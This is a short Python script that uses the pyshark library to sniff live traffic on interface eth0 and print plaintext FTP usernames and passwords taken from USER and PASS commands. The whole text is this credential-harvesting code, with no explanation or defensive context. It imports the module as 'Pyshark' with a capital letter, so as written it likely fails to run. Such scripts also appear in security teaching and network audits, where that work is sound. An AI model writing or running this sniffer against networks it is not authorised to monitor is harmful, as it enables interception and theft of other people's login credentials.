import Pyshark

capture = Pyshark.LiveCapture('eth0')
for packet in capture:
    if 'FTP' in packet:
        try:
            output = packet.ftp
            if 'USER' in str(output):
                print('FTP username:')
                print(output)
            elif 'PASS' in str(output):
                print('FTP password:')
                print(output)
        except:
            pass 